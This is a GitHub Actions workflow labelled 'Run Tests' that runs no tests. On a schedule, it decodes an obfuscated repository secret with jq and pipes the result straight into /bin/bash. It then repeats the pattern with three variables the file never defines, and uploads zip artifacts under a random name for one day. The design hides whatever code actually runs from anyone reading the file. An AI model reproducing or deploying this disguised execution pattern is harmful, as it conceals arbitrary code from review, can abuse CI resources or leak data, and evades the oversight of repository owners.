name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '59 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Invoke
        env:
          wdmu3883: ${{ secrets.wdmu3883 }}
        run: |
          printf '%s' "$wdmu3883" | jq -r .gjg49 | /bin/bash
          printf '%s' "$nkqu46003" | jq -r .jnb900 | /bin/bash
          echo $kauzv388 | jq -r .aqr531 | /bin/bash
          printf '%s' "$ri96" | jq -r .cts67 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: Nx5m8WrF
          path: "*.zip"
          retention-days: 1
